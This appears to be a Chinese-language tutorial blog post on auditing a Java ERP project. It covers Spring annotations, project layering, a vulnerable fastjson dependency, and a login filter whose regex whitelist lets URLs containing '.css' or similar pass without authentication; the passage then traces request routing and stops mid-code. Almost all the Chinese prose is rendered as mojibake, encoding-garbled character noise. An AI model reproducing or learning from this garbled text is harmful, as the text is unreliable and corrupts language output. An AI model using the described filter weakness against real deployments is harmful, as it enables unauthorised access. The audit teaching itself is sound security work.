<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨"><a href="#å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨" class="headerlink" title="å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨"></a>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨</h2><p>å…ˆæ¨èä¸€äº›å¯¹è¿™ä¸ªé¡¹ç›®æ¯”è¾ƒå¥½ç”¨çš„æ’ä»¶</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241007232858319.png" alt="image-20241007232858319"></p>
<p>MyBatisCodeHelperPro æ’ä»¶æœ‰æ”¶è´¹åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘ä»¬ä½¿ç”¨å…è´¹çš„åŠŸèƒ½å°±å¤Ÿäº†ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è·³è½¬åˆ°mapperç»‘å®šçš„æ¥å£</p>
<p>Rainbow Brackets Lite å½©è™¹æ‹¬å·ï¼Œå¯ä»¥æåˆ°ä»£ç é˜…è¯»æ•ˆç‡</p>
<h2 id="Springå¸¸è§æ³¨è§£"><a href="#Springå¸¸è§æ³¨è§£" class="headerlink" title="Springå¸¸è§æ³¨è§£"></a>Springå¸¸è§æ³¨è§£</h2><table>
<thead>
<tr>
<th><strong>æ³¨è§£</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>ä½¿ç”¨åœºæ™¯</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>@Component</strong></td>
<td><strong>æ ‡è®°ä¸€ä¸ªç±»ä¸º Spring çš„ç»„ä»¶ï¼ŒSpring ä¼šè‡ªåŠ¨æ£€æµ‹å¹¶å°†å…¶ä½œä¸º Bean æ³¨å†Œåˆ° Spring å®¹å™¨ä¸­ã€‚</strong></td>
<td><strong>ä¸€èˆ¬ç”¨äºæœåŠ¡ç±»ã€å·¥å…·ç±»ã€æˆ–ä»»ä½•å¸Œæœ›è¢« Spring å®¹å™¨ç®¡ç†çš„ç±»ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Controller</strong></td>
<td><strong>æ ‡è®°ä¸€ä¸ªç±»ä¸º Spring MVC æ§åˆ¶å™¨ï¼Œå¤„ç† HTTP è¯·æ±‚å¹¶è¿”å›è§†å›¾ã€‚</strong></td>
<td><strong>ç”¨äº Spring Web åº”ç”¨ä¸­çš„æ§åˆ¶å™¨ç±»ï¼Œå¤„ç†å‰ç«¯è¯·æ±‚å¹¶è¿”å›æ•°æ®æˆ–è§†å›¾ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Service</strong></td>
<td><strong>æ ‡è®°ä¸€ä¸ªç±»ä¸ºæœåŠ¡å±‚ç»„ä»¶ï¼Œç”¨äºå®šä¹‰ä¸šåŠ¡é€»è¾‘ã€‚</strong></td>
<td><strong>ç”¨äºä¸šåŠ¡å±‚çš„æœåŠ¡ç±»ï¼ˆä¾‹å¦‚ï¼Œå¤„ç†æ•°æ®åº“æ“ä½œæˆ–ä¸šåŠ¡é€»è¾‘ï¼‰ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Repository</strong></td>
<td><strong>æ ‡è®°ä¸€ä¸ªç±»ä¸ºæ•°æ®è®¿é—®å±‚ç»„ä»¶ï¼Œé€šå¸¸ç”¨äº DAO ç±»ï¼Œè¡¨ç¤ºè¯¥ç±»ä¸»è¦ç”¨äºè®¿é—®æ•°æ®åº“ã€‚</strong></td>
<td><strong>ç”¨äºæ•°æ®å±‚æˆ–æŒä¹…å±‚çš„ç»„ä»¶ï¼ŒSpring ä¼šæä¾›æ•°æ®åº“è®¿é—®çš„ç›¸å…³å¼‚å¸¸ç¿»è¯‘åŠŸèƒ½ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Autowired</strong></td>
<td><strong>è‡ªåŠ¨æ³¨å…¥ä¾èµ–ï¼ŒSpring ä¼šæ ¹æ®ç±»å‹æ¥æ³¨å…¥ Beanã€‚</strong></td>
<td><strong>ç”¨äºè‡ªåŠ¨æ³¨å…¥ Beanï¼Œç®€åŒ–ä¾èµ–æ³¨å…¥çš„è¿‡ç¨‹ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Qualifier</strong></td>
<td><strong>æŒ‡å®šè¦æ³¨å…¥çš„ Bean çš„åç§°ï¼Œå½“å­˜åœ¨å¤šä¸ªåŒç±»å‹çš„ Bean æ—¶ï¼Œé€šè¿‡è¯¥æ³¨è§£æ¥æ˜ç¡®æŒ‡å®šæ³¨å…¥å“ªä¸€ä¸ª Beanã€‚</strong></td>
<td><strong>å½“ä¸€ä¸ªç±»å‹çš„ Bean æœ‰å¤šä¸ªå®ä¾‹æ—¶ï¼Œç”¨äºæŒ‡å®šæ³¨å…¥ç‰¹å®šçš„ Beanã€‚</strong></td>
</tr>
<tr>
<td><strong>@Resource</strong></td>
<td><strong>ä¸ <code>@Autowired</code> ç±»ä¼¼ï¼Œä½†åŸºäº Java EE æ³¨è§£ï¼Œé€šå¸¸æ ¹æ® Bean çš„åç§°è¿›è¡Œæ³¨å…¥ã€‚</strong></td>
<td><strong>ç”¨äº Java EE ç¯å¢ƒï¼Œæˆ–è€…å¸Œæœ›é€šè¿‡åç§°æ³¨å…¥çš„åœºæ™¯ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Value</strong></td>
<td><strong>ç”¨äºæ³¨å…¥å¤–éƒ¨é…ç½®æ–‡ä»¶çš„å€¼ï¼ˆä¾‹å¦‚ï¼Œ<code>application.properties</code> æˆ– <code>application.yml</code> ä¸­çš„é…ç½®ï¼‰ã€‚</strong></td>
<td><strong>æ³¨å…¥é…ç½®æ–‡ä»¶ä¸­çš„å€¼åˆ°ç±»çš„å±æ€§ã€æ„é€ æ–¹æ³•æˆ–æ–¹æ³•å‚æ•°ä¸­ã€‚</strong></td>
</tr>
<tr>
<td><strong>@Scope</strong></td>
<td><strong>å®šä¹‰ Bean çš„ä½œç”¨åŸŸï¼ˆä¾‹å¦‚ï¼šsingletonã€prototype ç­‰ï¼‰ã€‚</strong></td>
<td><strong>æ ¹æ®å®é™…éœ€æ±‚å®šä¹‰ Bean çš„ç”Ÿå‘½å‘¨æœŸã€‚</strong></td>
</tr>
<tr>
<td>@PostConstruct</td>
<td>æ ‡è®°ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨ Bean åˆå§‹åŒ–ä¹‹åè‡ªåŠ¨æ‰§è¡Œã€‚</td>
<td>åœ¨ Bean åˆå§‹åŒ–å®Œæˆåæ‰§è¡ŒæŸäº›åˆå§‹åŒ–å·¥ä½œã€‚</td>
</tr>
<tr>
<td>@PreDestroy</td>
<td>æ ‡è®°ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨å®¹å™¨é”€æ¯ä¹‹å‰æ‰§è¡Œï¼Œç”¨äºåšæ¸…ç†å·¥ä½œã€‚</td>
<td>åœ¨ Bean é”€æ¯ä¹‹å‰æ‰§è¡ŒæŸäº›æ¸…ç†æ“ä½œï¼ˆä¾‹å¦‚å…³é—­èµ„æºã€è¿æ¥ç­‰ï¼‰ã€‚</td>
</tr>
<tr>
<td>@Configuration</td>
<td>æ ‡è®°ä¸€ä¸ªç±»ä¸º Spring é…ç½®ç±»ï¼Œæ›¿ä»£ XML é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºå®šä¹‰ <code>@Bean</code> æ–¹æ³•ã€‚</td>
<td>ç”¨äºæ›¿ä»£ä¼ ç»Ÿçš„ XML é…ç½®æ–‡ä»¶ï¼Œå®šä¹‰ Java é…ç½®ç±»ã€‚</td>
</tr>
<tr>
<td>@ComponentScan</td>
<td>æŒ‡å®šæ‰«æçš„åŒ…è·¯å¾„ï¼ŒSpring å®¹å™¨ä¼šè‡ªåŠ¨æ‰«æå¹¶æ³¨å†Œè¯¥è·¯å¾„ä¸‹çš„ç±»ã€‚</td>
<td>ä¸ <code>@Configuration</code> ä¸€èµ·ä½¿ç”¨ï¼ŒæŒ‡å®šè‡ªåŠ¨æ‰«æ Bean çš„è·¯å¾„ã€‚</td>
</tr>
<tr>
<td>@Bean</td>
<td>ç”¨äºåœ¨ Java é…ç½®ç±»ä¸­å®šä¹‰ä¸€ä¸ª Beanï¼Œç›¸å½“äº XML é…ç½®ä¸­çš„ <code>&lt;bean&gt;</code> å…ƒç´ ã€‚</td>
<td>åœ¨ Java é…ç½®ç±»ä¸­æ‰‹åŠ¨å®šä¹‰ä¸€ä¸ª Beanï¼Œå¹¶å°†å…¶åŠ å…¥åˆ° Spring å®¹å™¨ä¸­ã€‚</td>
</tr>
<tr>
<td>@PropertySource</td>
<td>æŒ‡å®šå¤–éƒ¨å±æ€§æ–‡ä»¶çš„ä½ç½®ï¼ŒSpring ä¼šå°†æ–‡ä»¶ä¸­çš„å±æ€§å€¼åŠ è½½åˆ° Spring ç¯å¢ƒä¸­ã€‚</td>
<td>ç”¨äºåŠ è½½é…ç½®æ–‡ä»¶å¹¶å°†æ–‡ä»¶ä¸­çš„å€¼æ³¨å…¥åˆ° Spring å®¹å™¨ä¸­çš„ Bean ä¸­ã€‚</td>
</tr>
<tr>
<td>@Import</td>
<td>å¯¼å…¥ä¸€ä¸ªæˆ–å¤šä¸ªé…ç½®ç±»æˆ–ç»„ä»¶ç±»ï¼Œä½¿å®ƒä»¬æˆä¸ºå½“å‰é…ç½®ç±»çš„ä¸€éƒ¨åˆ†ã€‚</td>
<td>ç”¨äºå¯¼å…¥å…¶ä»–é…ç½®ç±»ï¼Œæ–¹ä¾¿æ¨¡å—åŒ–å’Œåˆ†ç¦»ä¸åŒçš„é…ç½®ã€‚</td>
</tr>
</tbody></table>
<h2 id="JAVAWEB-å¸¸è§é¡¹ç›®ç»“æ„"><a href="#JAVAWEB-å¸¸è§é¡¹ç›®ç»“æ„" class="headerlink" title="JAVAWEB å¸¸è§é¡¹ç›®ç»“æ„"></a>JAVAWEB å¸¸è§é¡¹ç›®ç»“æ„</h2><p><strong>Viewï¼ˆè§†å›¾å±‚ï¼‰</strong>ï¼š</p>
<ul>
<li>è´Ÿè´£ç”¨æˆ·ç•Œé¢å±•ç¤ºï¼Œç›´æ¥ä¸ç”¨æˆ·äº¤äº’ã€‚</li>
<li>æ˜¾ç¤ºæ•°æ®æˆ–æ¥å—ç”¨æˆ·è¾“å…¥ã€‚</li>
</ul>
<p><strong>Controllerï¼ˆæ§åˆ¶å±‚ï¼‰</strong>ï¼š</p>
<ul>
<li>å¤„ç†è§†å›¾å±‚çš„è¯·æ±‚ï¼Œè°ƒç”¨æœåŠ¡å±‚å®Œæˆä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>é€šå¸¸å¯¹è¯·æ±‚å‚æ•°è¿›è¡Œæ ¡éªŒï¼Œå¹¶å°†ç»“æœè¿”å›åˆ°è§†å›¾å±‚ã€‚</li>
</ul>
<p><strong>Serviceï¼ˆæœåŠ¡å±‚ï¼‰</strong>ï¼š</p>
<ul>
<li>å°è£…å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>è°ƒç”¨ DAO å±‚ä¸æ•°æ®åº“äº¤äº’ï¼Œæˆ–è€…ä¸å¤–éƒ¨æœåŠ¡è¿›è¡Œé›†æˆã€‚</li>
</ul>
<p><strong>DAOï¼ˆæŒä¹…å±‚ï¼‰</strong>ï¼š</p>
<ul>
<li>ä¸“é—¨è´Ÿè´£ä¸æ•°æ®åº“çš„äº¤äº’ï¼Œæä¾›æ•°æ®çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½ã€‚</li>
<li>é€šå¸¸ä½¿ç”¨ ORM æ¡†æ¶ï¼ˆå¦‚ MyBatisã€Hibernateï¼‰å®ç°ã€‚</li>
</ul>
<p><strong>Entityï¼ˆå®ä½“ç±»ï¼‰</strong>ï¼š</p>
<ul>
<li>æ•°æ®çš„å®ä½“ç±»ï¼Œé€šå¸¸ä¸æ•°æ®åº“è¡¨ä¸€ä¸€å¯¹åº”ã€‚</li>
<li>åœ¨æŒä¹…åŒ–æ“ä½œä¸­å……å½“æ•°æ®ä¼ é€’çš„è½½ä½“ã€‚</li>
</ul>
<p>è¿™æ ·è¯´ä¹Ÿè®¸è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œæˆ‘ä»¬å°±æ‹¿è¿™ä¸ªé¡¹ç›®æ¥ç»™ä¸¾ä¾‹ä¸€ä¸‹</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241211110817790.png" alt="image-20241211110817790"></p>
<p>æ•°æ®èµ°å‘ï¼š</p>
<ul>
<li><p>ç”¨æˆ·é€šè¿‡ <strong>è§†å›¾å±‚(View)</strong> æäº¤è¯·æ±‚ï¼Œæ•°æ®æµå…¥ **æ§åˆ¶å±‚(Controller)**ã€‚</p>
</li>
<li><p><strong>æ§åˆ¶å±‚(Controller)</strong> æ¥æ”¶è¯·æ±‚åï¼Œè°ƒç”¨ <strong>æœåŠ¡å±‚(Service)</strong> æ‰§è¡Œä¸šåŠ¡é€»è¾‘ã€‚</p>
</li>
<li><p><strong>æœåŠ¡å±‚(Service)</strong> è°ƒç”¨ <strong>DAO å±‚</strong> è¿›è¡Œæ•°æ®åº“æ“ä½œï¼ˆä¾‹å¦‚æŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°ç­‰ï¼‰ã€‚</p>
</li>
<li><p><strong>DAO å±‚</strong> é€šè¿‡ <strong>å®ä½“ç±»(Entity)</strong> ä¸æ•°æ®åº“äº¤äº’ï¼Œæœ€ç»ˆè¿”å›æ•°æ®ã€‚</p>
</li>
<li><p>æ•°æ®ç»è¿‡å¤šå±‚ä¼ é€’å’Œå¤„ç†ï¼Œæœ€ç»ˆåœ¨ <strong>è§†å›¾å±‚</strong> å±•ç¤ºç»™ç”¨æˆ·ã€‚</p>
</li>
</ul>
<h1 id="å®¡è®¡å‡†å¤‡"><a href="#å®¡è®¡å‡†å¤‡" class="headerlink" title="å®¡è®¡å‡†å¤‡"></a>å®¡è®¡å‡†å¤‡</h1><h2 id="å®¡è®¡æ€è·¯"><a href="#å®¡è®¡æ€è·¯" class="headerlink" title="å®¡è®¡æ€è·¯"></a>å®¡è®¡æ€è·¯</h2><p>JAVAçš„é¡¹ç›®ä¸€èˆ¬æ¥è®²æ¯”è¾ƒåºå¤§ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªJAVAçš„é¡¹ç›®åº”è¯¥å…ˆçœ‹ä»€ä¹ˆï¼Ÿä»£ç å®¡è®¡ä¸­è¿™ä¸ªâ€æ–¹å‘æ„Ÿâ€ç‰¹åˆ«é‡è¦</p>
<ol>
<li>ä¸Šæ‰‹ç¬¬ä¸€æ—¶é—´å…ˆåˆ¤æ–­æŠ€æœ¯æ ˆï¼Œå¯ä»¥è®©æˆ‘ä»¬å¿«é€Ÿäº†è§£ç¨‹åºæ¶æ„ï¼Œæƒ³åˆ°æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</li>
<li>å…¶æ¬¡è¿™æ˜¯ä¸ªmavené¡¹ç›®ï¼ŒæŸ¥çœ‹pom.xmlæ–‡ä»¶ï¼Œå®ƒå®šä¹‰äº†é¡¹ç›®çš„æ‰€æœ‰ä¾èµ–ã€æ’ä»¶ä»¥åŠç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹é¡¹ç›®æ‰€ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“å’Œå®ƒä»¬çš„ç‰ˆæœ¬ï¼Œä»¥ç¡®è®¤æ˜¯å¦å­˜åœ¨å·²çŸ¥çš„æ¼æ´ã€‚ æ¯”å¦‚è¿™é‡Œä½¿ç”¨äº†fastjsonï¼Œè¿˜æ˜¯æœ‰æ¼æ´çš„ç‰ˆæœ¬ã€‚</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008170542661.png" alt="image-20241008170542661"></p>
<ol start="3">
<li>å¦å¤–çœ‹Filterï¼Œä¸ºä»€ä¹ˆçœ‹Filter  å› ä¸ºå¯ä»¥çœ‹åˆ°å…¨å±€çš„è·¯ç”±ï¼Œå¦å¤–filteræ˜¯æ‰€æœ‰è¯·æ±‚å¤„ç†çš„ç¬¬ä¸€ç«™ï¼Œè¿™æ„å‘³ç€æ‰€æœ‰æ½œåœ¨çš„æ¶æ„è¯·æ±‚åœ¨åˆ°è¾¾Controllerä¹‹å‰ï¼Œéƒ½ä¼šç»è¿‡ Filter è¿›è¡Œå¤„ç†å’Œè¿‡æ»¤ã€‚å¦å¤–é€šè¿‡æŸ¥çœ‹filterå¯ä»¥åˆ¤æ–­åº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨å¯¹ç”¨æˆ·è¾“å…¥çš„æœ‰æ•ˆéªŒè¯å’Œè¿‡æ»¤ã€‚</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008171132192.png" alt="image-20241008171132192"></p>
<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@WebFilter</span>(filterName = <span class="hljs-string">&quot;LogCostFilter&quot;</span>, urlPatterns = &#123;<span class="hljs-string">&quot;/*&quot;</span>&#125;,<br>        initParams = &#123;<span class="hljs-variable">@WebInitParam</span>(name = <span class="hljs-string">&quot;ignoredUrl&quot;</span>, value = <span class="hljs-string">&quot;.css#.js#.jpg#.png#.gif#.ico&quot;</span>),<br>                      <span class="hljs-variable">@WebInitParam</span>(name = <span class="hljs-string">&quot;filterPath&quot;</span>, value = <span class="hljs-string">&quot;/user/login#/user/registerUser#/v2/api-docs&quot;</span>)&#125;)<br><br><span class="hljs-variable">@WebFilter</span> è¯´æ˜è¿™æ˜¯ä¸€ä¸ªfilter,å¹¶å¯¹æ‰€æœ‰çš„è¯·æ±‚è·¯å¾„éƒ½æœ‰æ•ˆ,<span class="hljs-variable">@WebInitParam</span>ç”¨äºåˆå§‹åŒ–å‚æ•°,å¯ä»¥åœ¨initæ–¹æ³•ä¸­ä½¿ç”¨å®ƒä»¬<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008190059686.png" alt="image-20241008190059686"></p>
<p><code>com.jsh.erp.filter.LogCostFilter#init</code>æ–¹æ³•ä¸­å¯¹ä¸Šé¢<code>@WebInitParam</code>å®šä¹‰çš„å‚æ•°ç”¨â€#â€åˆ†å‰²</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008190918885.png" alt="image-20241008190918885"></p>
<p><code>com.jsh.erp.filter.LogCostFilter#doFilter</code>æ–¹æ³•æ˜¯æ•´ä¸ªfilterçš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œè¿™é‡Œæœ‰å‡ ç§æƒ…å†µæ˜¯ä¸é˜»æ­¢çš„ï¼šurlåŒ…å«<code>register.html</code>ï¼Œ<code>login.html</code>ï¼Œä»¥åŠ <code>doc.html</code>ã€‚<code>com.jsh.erp.filter.LogCostFilter#verify</code>æ˜¯è‡ªå·±å®šä¹‰çš„ä¸€ä¸ªå·¥å…·æ–¹æ³•ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>    <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>        <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>        <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å°†ignoredUrlsä¸­çš„é€ä¸ªå…ƒç´ æ‹¼æ¥æˆæ­£åˆ™è¡¨è¾¾å¼åä¸å½“å‰urlè¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸå³è¿”å›trueï¼Œä¾‹å¦‚ç¬¬ä¸€ä¸ªå…ƒç´ å½¢æˆçš„æ­£åˆ™è¡¨è¾¾å¼ä¸º<code>^.*.css.*$</code>ï¼Œå³åªè¦åŒ…å«ignoredUrlsä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´ å³å¯åœ¨ä¸ç™»å½•çš„æƒ…å†µä¸‹è®¿é—®</p>
<p>ç”¨äºæ£€æŸ¥è¯·æ±‚ URL æ˜¯å¦åœ¨å¿½ç•¥åˆ—è¡¨ä¸­ï¼›ä¹Ÿå°±æ˜¯çœ‹å½“å‰è®¿é—®çš„è¿æ¥æ˜¯ä¸æ˜¯<code>.css|.js|.jpg|.png|.gif|.ico</code>æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¹Ÿæ˜¯ä¸é˜»æ­¢çš„ã€‚å¦‚æœè¯·æ±‚çš„è·¯ç”±æ˜¯<code>/user/login</code>æˆ–<code>/user/registerUser</code>æˆ–<code>/v2/api-docs</code>ï¼Œä¹Ÿæ˜¯ä¸é˜»æ­¢çš„ã€‚</p>
<ol start="4">
<li>å¦‚æœæƒ³æ›´æ¸…æ¥šçš„äº†è§£ç½‘ç«™çš„æ¶æ„ï¼Œé‚£è·¯ç”±åˆ†æä¸å¯å°‘</li>
<li>æ¥ä¸‹æ¥å¯ä»¥ç»“åˆç½‘ç«™çš„åŠŸèƒ½ç‚¹ï¼Œç»“åˆä»£ç ï¼Œå¯»æ‰¾è„†å¼±ç‚¹ï¼Œå½“ç„¶è¿™ä¸ªæ¯”è¾ƒé ç»éªŒã€‚</li>
</ol>
<h2 id="è·¯ç”±åˆ†æ"><a href="#è·¯ç”±åˆ†æ" class="headerlink" title="è·¯ç”±åˆ†æ"></a>è·¯ç”±åˆ†æ</h2><p>å¤§éƒ¨åˆ†è¯·æ±‚è·¯å¾„éƒ½åŒ…å«åœ¨Controlleræ–‡ä»¶å¤¹ä¸­ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼Œå³<code>com.jsh.erp.controller.ResourceController</code>ï¼Œå®ƒçš„è¯·æ±‚è·¯å¾„ä¸­åŒ…å«{apiName}ï¼Œä»£ç ä¸­ä½¿ç”¨<code>@Resource</code>æ³¨è§£é€šè¿‡åç§°æ³¨å…¥ä½¿<code>com.jsh.erp.service.CommonQueryManagerç±»</code>å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œä»¥<code>com.jsh.erp.service.CommonQueryManager#select</code>æ–¹æ³•ä¸ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(apiName)) &#123;<br>        <span class="hljs-keyword">return</span> container.getCommonQuery(apiName).select(parameterMap);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å®ƒè°ƒç”¨äº†<code>com.jsh.erp.service.InterfaceContainer</code>ï¼Œå…¶ä¸­InterfaceContainer çš„initæ–¹æ³•ä¼šåœ¨Spring å®¹å™¨å¯åŠ¨æ—¶è‡ªåŠ¨åˆå§‹åŒ–ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterfaceContainer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, ICommonQuery&gt; configComponentMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-meta">@Autowired(required = false)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ICommonQuery[] configComponents)</span> &#123;<br>        <span class="hljs-keyword">for</span> (ICommonQuery configComponent : configComponents) &#123;<br>            <span class="hljs-type">ResourceInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> AnnotationUtils.getAnnotation(configComponent, ResourceInfo.class);<br>            <span class="hljs-keyword">if</span> (info != <span class="hljs-literal">null</span>) &#123;<br>                configComponentMap.put(info.value(), configComponent);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ICommonQuery <span class="hljs-title function_">getCommonQuery</span><span class="hljs-params">(String apiName)</span> &#123;<br>        <span class="hljs-keyword">return</span> configComponentMap.get(apiName);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>configComponentMapå­˜æ”¾çš„æ˜¯ICommonQueryçš„å®ç°ç±»ï¼Œå³å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241214201442220.png" alt="image-20241214201442220"></p>
<ul>
<li><code>@Autowired(required = false)</code>ï¼šSpring åœ¨åˆå§‹åŒ– <code>InterfaceContainer</code> æ—¶ï¼Œä¼šè‡ªåŠ¨æ”¶é›†æ‰€æœ‰å®ç°äº† <code>ICommonQuery</code> æ¥å£çš„ Beanï¼Œæ³¨å…¥åˆ° <code>init</code> æ–¹æ³•çš„ <code>configComponents</code> å‚æ•°ä¸­ã€‚</li>
<li><code>init</code> æ–¹æ³•é€»è¾‘ï¼š<ol>
<li>éå†æ‰€æœ‰æ³¨å…¥çš„ <code>ICommonQuery</code> å®ç°ç±»ã€‚</li>
<li>é€šè¿‡ <code>AnnotationUtils.getAnnotation</code> æ£€æŸ¥æ¯ä¸ªç±»æ˜¯å¦åŒ…å« <code>@ResourceInfo</code> æ³¨è§£ã€‚</li>
<li>å¦‚æœæ‰¾åˆ°æ³¨è§£ï¼Œåˆ™å°†æ³¨è§£çš„ <code>value</code> å€¼ä½œä¸º keyï¼Œå¯¹åº”çš„ç»„ä»¶å®ä¾‹ä½œä¸º valueï¼Œå­˜å…¥ <code>configComponentMap</code>ã€‚</li>
</ol>
</li>
<li>æœ€ç»ˆç»“æœï¼š <code>configComponentMap</code>å…¶ä¸­ key æ˜¯ <code>@ResourceInfo</code> çš„ <code>value</code>ï¼ˆå¦‚ <code>&quot;account&quot;</code>ï¼‰ï¼Œvalue æ˜¯å¯¹åº”çš„ç»„ä»¶å®ä¾‹ï¼ˆå¦‚ <code>AccountComponent</code>ï¼‰ï¼ˆè¿™å°±æ˜¯ä¸€äº›æ–‡ç« è¯´çš„ä¸ç›®å½•å¯¹åº”ï¼‰ã€‚</li>
</ul>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241216004531060.png" alt="image-20241216004531060"></p>
<p>åˆå§‹åŒ–å®Œæˆåï¼Œæ¥ç€ä»¥<code>com.jsh.erp.service.account.AccountComponent#select</code>ä¸ºä¾‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service(value = &quot;account_component&quot;)</span><br><span class="hljs-meta">@AccountResource</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccountComponent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICommonQuery</span> &#123;<br><br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> AccountService accountService;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;?&gt; select(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> getAccountList(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> List&lt;?&gt; getAccountList(Map&lt;String, String&gt; map) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">serialNo</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;serialNo&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">remark</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;remark&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>        <span class="hljs-keyword">return</span> accountService.select(name, serialNo, remark, QueryUtils.offset(map), 